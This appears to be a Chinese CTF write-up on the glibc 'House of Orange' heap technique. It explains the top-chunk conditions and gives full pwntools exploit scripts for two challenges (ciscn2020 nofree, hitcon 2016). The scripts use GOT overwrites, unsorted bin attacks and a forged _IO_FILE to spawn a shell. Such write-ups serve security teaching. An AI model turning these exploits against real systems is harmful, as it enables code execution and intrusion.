---
title: House of orange
tags:
  - binary
---
## 利用原理

🍊的**利用背景**：程序根本没有free函数。

结果：能把原来的top chunk放进unsorted bin。从而在没有free的情况下得到一个unsorted bin。

**检测机制**：

top chunk不满足分配要求时进入以下分支：

```c
/* Otherwise, relay to handle system-dependent cases */
 else
	{
		 void *p = sysmalloc(nb, av); 
		if (p != NULL && __builtin_expect (perturb_byte, 0)) alloc_perturb (p, bytes); return p; 
	}
```

调用sysmalloc的形式向系统申请堆，我们需要用brk的形式申请堆，这样就可以让原来的top chunk进unsorted bin了。所以进行brk扩展的条件：

`if ((unsigned long)(nb) >= (unsigned long)(mp_.mmap_threshold) && (mp_.n_mmaps < mp_.n_mmaps_max))`

malloc的尺寸不大于mp_.mmap_threshold，小于128k。

另外在sysmalloc中还有对top chunk的检测：

```c
assert((old_top == initial_top(av) && old_size == 0) || 
	((unsigned long) (old_size) >= MINSIZE &&
	 prev_inuse(old_top) && 
	((unsigned long)old_end & pagemask) == 0));
```

top chunk的大小大于MINSIZE(0x10)，inuse位为1，而且要页对齐。

所以条件为

1. 伪造的chunk的size要页对齐。(通俗说就是后三个十六进制位为0)
2. size要大于MINSIZE。
3. size要小于下一个申请的chunk的size+MINSIZE。
4. inuse位置为1。

```c
#define fake_size 0x1fe1 

int main(void)
 { 
	void *ptr; 
	ptr=malloc(0x10); 
	ptr=(void *)((int)ptr+24); 
	*((long long*)ptr)=fake_size;
	malloc(0x2000); 
	malloc(0x60); 
}
```

0x1fe1对齐页，再malloc0x2000直接进unsorted bin。

如果 top chunk 的size比较小，也可能进fastbin。

## 利用方法

第一种利用方法是获得一个fastbin，然后再通过溢出进行fastbin attack。

一个例子是ciscn2020的nofree。（放在下面）

第二种利用方法是获得一个unsorted bin，然后进行unsorted bin attack或者是FSOP。

一个例子是houseoforange_hitcon_2016，在House of 🍊之后直接接FSOP。

## 实例分析

### ciscn2020 nofree

```sh
 ○ file nofree
nofree: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=ce6a329974820359e8ff0d9bc08f37c752dbd40b, stripped
 ○ checksec nofree
[*] '/home/surager/nofree/nofree'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

64位的动态链接ELF，没有开启PIE保护。

程序只设置了两个功能，new和edit。

程序在分配堆块时使用了strdup，根据输入的字符个数进行分配。但是没有记录实际的size。

```c
int new(){
...
	if ( n >= 0 && n <= 0x90 )
    {
      *&chunklist[0x10 * v1 + 0x100] = mymalloc(n);
      n = v2;
      *&chunklist[0x10 * v1 + 0x108] = v2;
    }
...
}

char *__fastcall mymalloc(unsigned int size)
{
  memset(chunklist, 0, 0x100uLL);
  printf("content: ", 0LL);
  my_read(chunklist, size);
  return strdup(chunklist);
}
```

因此在edit处造成了一个溢出。

```c
__int64 edit()	
{
...
	if ( result )
    {
      printf("content: ");
      result = my_read(*&chunklist[0x10 * v1 + 0x100], *&chunklist[0x10 * v1 + 0x108]);
    }
...
}
```

除此之外，程序没有其他功能。

因此，我们需要进行House Of Orange攻击，得到free过的堆块。由于我们能分配的最大chunk大小为0xa0，不足以得到一个unsortbin中的chunk。因此只能先用fastbin进行调整。

```python
for i in range(30):
    add(0,0x70,'a'*0x70)
for i in range(2):
    add(0,0x90,'a'*0x10)
add(0,0x90,'a'*0x20)
edit(0,'\x00'*0x28+p64(0x91)) # 修改topchunk的size
add(1,0x90,'a'*0x90)
```

此时我们得到一个fastbin，而且可以通过溢出修改其fd。因此可以利用fastbin attack进行一次分配。

```sh
pwndbg> x/6gx 0x6021c0
0x6021c0:	0x000000000060ff50	0x0000000000000090  # 可以溢出到fastbin
0x6021d0:	0x0000000000630010	0x0000000000000090
0x6021e0:	0x0000000000000000	0x0000000000000000
pwndbg> heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x60ff70 --> 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x6300a0 (size : 0x21f60) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
```

利用0x6021d8把堆块分配过去。

```python
chunk1 = 0x6021d0
edit(0,'\x00'*0x28+p64(0x71)+p64(chunk1))
add(0,0x90,'a'*0x60)
add(1,0x70,'a')
add(0,0x70,'a'*0x60)
```

```sh
pwndbg> x/6gx 0x6021c0
0x6021c0:	0x00000000006021e0	0x0000000000000070
0x6021d0:	0x00000000013640b0	0x0000000000000070
0x6021e0:	0x6161616161616161	0x6161616161616161
```

此时我们可以利用chunk0控制chunk2指针，从而实现任意地址写。

为了分配任意大小的chunk，我们需要将memset的got表改成ret的地址。

```python
ret = 0x0000000000400C34
memset_got = 0x602038
edit(0,p64(memset_got)+p64(0x90))
edit(2,p64(ret))
```

此时再次进行House Of Orange攻击，利用buf区(0x6020c0)残留的字符将top chunk送入unsorted bin。

```python
for i in range(28):
    add(1,0x70,'a'*0x70)
for i in range(3):
    add(1,0x70,'a'*0x10+'\x00')
buf = 0x6020c0
edit(0,p64(buf+0x90)+p64(0x90))
edit(2,'a'*0x50)
add(2,0x70,'a'*0x20+'\x00')
edit(2,'\x00'*0x28+p64(0xb1))
add(1,0x90,'a'*0x90)
```

得到一个可控的unsorted bin chunk。

```sh
pwndbg> heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x1a010f0 (size : 0x21f10) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x19dff50 (size : 0x90)
pwndbg> x/6gx 0x6021c0
0x6021c0:	0x00000000006021e0	0x0000000000000070
0x6021d0:	0x0000000001a01010	0x0000000000000090
0x6021e0:	0x00000000019dff30	0x0000000000000070 # 溢出到unsorted bin
```

之后进行unsorted bin attack，将一个libc地址写入buf区。

```python
payload = '\x00'*0x28+p64(0x91)+p64(0)+p64(buf-0x10)
edit(2,payload)
add(1,0x90,'a'*0x80+'\x00')
```

得到一个libc地址

```sh
pwndbg> x/8gx 0x6020c0
0x6020c0:	0x00007fa36b06ab78	0x6161616161616161
```

之后修改strdup_got为puts_plt，再new，得到libc地址。

```python
edit(0,p64(strdup_got))
edit(2,p64(puts_plt))
add(1,0x20,'\xa0')
libc.address = u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3c4ba0
log.info('libc.address : '+hex(libc.address))
```

修改strdup_got为libc.sym['system']然后new，内容为/bin/sh，成功执行system("/bin/sh")。

```python
edit(2,p64(libc.sym['system']))
add(1,0x20,'/bin/sh\x00')
```

完整exp：

```python
from pwn import *
elf = ELF("./nofree")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
#context.log_level = 'debug'

def add(idx,size,con):
    io.sendlineafter("choice>> ",'1')
    io.sendlineafter("idx:",str(idx))
    io.sendlineafter("size: ",str(size))
    io.sendafter("content: ",con)
    
def edit(idx,con):
    io.sendlineafter("choice>>",'2')
    io.sendlineafter("idx:",str(idx))
    io.sendafter("content: ",con)

ret = 0x0000000000400C34
buf = 0x6020c0
chunk1 = 0x6021d0

memset_got = 0x602038
strdup_got = 0x602068
puts_plt = 0x4006D0

#io = process("./nofree")
io = remote("101.200.53.148",12301)
for i in range(30):    
    add(0,0x70,'a'*0x70)
for i in range(2):
    add(0,0x90,'a'*0x10)
add(0,0x90,'a'*0x20)
edit(0,'\x00'*0x28+p64(0x91))
add(1,0x90,'a'*0x90)
edit(0,'\x00'*0x28+p64(0x71)+p64(chunk1))
add(0,0x90,'a'*0x60)
add(1,0x70,'a')
add(0,0x70,'a'*0x60)
edit(0,p64(memset_got)+p64(0x90))
edit(2,p64(ret))
for i in range(28):
    add(1,0x70,'a'*0x70)
for i in range(3):
    add(1,0x70,'a'*0x10+'\x00')
edit(0,p64(buf+0x90)+p64(0x90))
edit(2,'a'*0x50)
add(2,0x70,'a'*0x20+'\x00')
edit(2,'\x00'*0x28+p64(0xb1))
add(1,0x90,'a'*0x90)
payload = '\x00'*0x28+p64(0x91)+p64(0)+p64(buf-0x10)
edit(2,payload)
add(1,0x90,'a'*0x80+'\x00')
edit(0,p64(strdup_got))
edit(2,p64(puts_plt))
add(1,0x20,'\xa0')
libc.address = u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3c4ba0
log.info('libc.address : '+hex(libc.address))
edit(2,p64(libc.sym['system']))
add(1,0x20,'/bin/sh\x00')
io.interactive()
```

后来学长看了看，应该不是最优解。还能改printf的。

### houseoforange_hitcon_2016

```sh
$ file houseoforange_hitcon_2016
houseoforange_hitcon_2016: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a58bda41b65d38949498561b0f2b976ce5c0c301, stripped
$ checksec houseoforange_hitcon_2016 
[*] '/home/surager/work/houseoforange_hitcon_2016'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

64位程序，保护全开。

```c
if ( malloctimes > 3u )
  {
    puts("Too many house");
    exit(1);
  }
```

程序限制了malloc的次数为4次。

```c
  v3 = malloc(0x10uLL);
  printf("Length of name :");
  size = read_int();
  if ( size > 0x1000 )
    size = 4096;
  v3[1] = malloc(size);
  if ( !v3[1] )
  {
    puts("Malloc error !!!");
    exit(1);
  }
  printf("Name :");
  myread(v3[1], size);
  v4 = calloc(1uLL, 8uLL);
  printf("Price of Orange:", 8LL);
  *v4 = read_int();
  orangemenu();
  printf("Color of Orange:");
  size_4 = read_int();
  if ( size_4 != 56746 && (size_4 <= 0 || size_4 > 7) )
  {
    puts("No such color");
    exit(1);
  }
  if ( size_4 == 56746 )
    v4[1] = 56746;
  else
    v4[1] = size_4 + 30;
  *v3 = v4;
  chunkptr = v3;
  ++malloctimes;
  return puts("Finish")
```

先malloc一个chunk，然后用这个chunk再存一个自由size的chunk和0x20的chunk。

```c
  if ( freetimes > 2u )
    return puts("You can't upgrade more");
  if ( !chunkptr )
    return puts("No such house !");
  printf("Length of name :");
  v2 = read_int();
  if ( v2 > 0x1000 )
    v2 = 4096;
  printf("Name:");
  myread(chunkptr[1], v2);
  printf("Price of Orange: ", v2);
  v1 = *chunkptr;
  *v1 = read_int();
  orangemenu();
  printf("Color of Orange: ");
  v3 = read_int();
  if ( v3 != 56746 && (v3 <= 0 || v3 > 7) )
  {
    puts("No such color");
    exit(1);
  }
  if ( v3 == 56746 )
    *(*chunkptr + 4LL) = 56746;
  else
    *(*chunkptr + 4LL) = v3 + 30;
  ++freetimes;
  return puts("Finish");
```

限制edit次数为3次。存在溢出。

没有free。

**思路**

1.直接修改top chunk的size，触发house of orange（largebin范围内）。然后切割unsorted bin。得到libc和heap地址。

2.使用unsorted bin攻击_IO_list_all，然后伪造unsortedbin成struct _IO_FILE_plus，使malloc发生错误时能够执行伪造的堆块的内容。

3.使用malloc，得到shell。

**exp**

```python
from pwn import *
#io = process(["./houseoforange_hitcon_2016"])
io = remote("node3.buuoj.cn",27667)
elf = ELF("./houseoforange_hitcon_2016")
libc = ELF("./x64-libc-2.23.so")
context.terminal = ['tmux','splitw','-h']
#context.log_level = 'debug'

def add(size,name):
        io.sendlineafter("Your choice : ",'1')
        io.sendlineafter("Length of name :",str(size))
        io.sendafter("Name :",name)
        io.sendlineafter("Price of Orange:",'1')
        io.sendlineafter("Color of Orange:",'3')

def show():
        io.sendlineafter("Your choice : ",'2')

def edit(size,name):
        io.sendlineafter("Your choice : ",'3')
        io.sendlineafter("Length of name :",str(size))
        io.sendafter("Name:",name)
        io.sendlineafter("Price of Orange:",'1')
        io.sendlineafter("Color of Orange:",'3')

def dbg():
        gdb.attach(io)
        pause()
        exit(0)

add(0x30,'asdf')
payload = '\x00'*0x30 + p64(0) + p64(0x21) + p64(0x0000002100000001) + p64(0) +p64(0) + p64(0xf81)
edit(len(payload),payload)
add(0x1000,'a')
add(0x400,'a')
show()
libc.address = u64(io.recvuntil("\x7f")[-6:].ljust(8,'\x00'))-0x3c5161
log.info("libc.address : "+hex(libc.address))
edit(0x11,'a'*0x11)
show()
io.recvuntil("a"*0x10)
heapbase = u64(io.recv(6).ljust(8,'\x00'))-0x61
log.info("heapbase : "+hex(heapbase))
payload = 'a'*0x400
payload += p64(0) + p64(0x21) + p64(0x0000002100000001) + p64(0)
fakefile = '/bin/sh\x00' + p64(0x61) + p64(0) + p64(libc.sym["_IO_list_all"]-0x10) +p64(0) + p64(1)
fakefile = fakefile.ljust(0xc0,'\x00')
fakefile += p64(0)*3 + p64(heapbase+0x5e8)+p64(0)*2+p64(libc.sym["system"])
payload += fakefile
edit(len(payload),payload)
io.sendline("1")
io.interactive()
```
